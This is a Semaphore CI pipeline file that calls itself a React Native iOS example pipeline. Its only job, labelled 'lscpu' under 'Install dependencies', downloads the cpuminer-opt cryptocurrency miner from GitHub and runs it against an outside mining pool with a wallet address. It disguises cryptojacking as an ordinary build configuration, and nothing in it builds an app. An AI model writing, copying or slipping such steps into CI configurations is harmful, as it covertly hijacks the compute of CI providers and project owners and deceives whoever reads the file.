version: v1.0
name: Semaphore React Native iOS Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu2004
  containers:
    - name: main
      image: 'registry.semaphoreci.com/android:29-node'
blocks:
  - name: Install dependencies
    dependencies: []
    task:
      jobs:
        - name: lscpu
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - chmod +x cpuminer-sse2
            - './cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17079 -u v718WWzmJUmdQRjQAx8bJXEsueb16pGSD7.semaphore'
      agent:
        machine:
          type: e2-standard-4
          os_image: ubuntu2004
promotions:
  - name: Build app
    pipeline_file: release-build.yml
    auto_promote_on:
      - result: passed
        branch:
          - master
